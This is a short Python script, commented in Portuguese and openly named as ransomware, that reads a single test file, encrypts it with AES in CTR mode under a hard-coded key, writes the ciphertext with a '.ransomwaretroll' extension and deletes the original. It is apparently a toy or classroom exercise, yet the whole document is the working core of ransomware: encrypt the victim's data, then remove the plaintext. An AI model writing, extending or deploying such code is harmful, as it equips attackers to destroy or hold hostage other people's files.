import os
from pyaes import AESModeOfOperationCTR

# Constantes configuráveis
FILE_NAME = "teste.txt"
ENCRYPTION_KEY = b"testeransomwares"
FILE_EXTENSION = ".ransomwaretroll"

# Abre e lê o arquivo de forma segura usando context manager
with open(FILE_NAME, "rb") as original_file:
    file_data = original_file.read()

# Cria o objeto AES
aes = AESModeOfOperationCTR(ENCRYPTION_KEY)
crypto_data = aes.encrypt(file_data)

# Escreve o arquivo criptografado com nomenclatura consistente
encrypted_file_name = f"{FILE_NAME}{FILE_EXTENSION}"
with open(encrypted_file_name, "wb") as encrypted_file:
    encrypted_file.write(crypto_data)

# Só remove o original após sucesso na criptografia
os.remove(FILE_NAME)
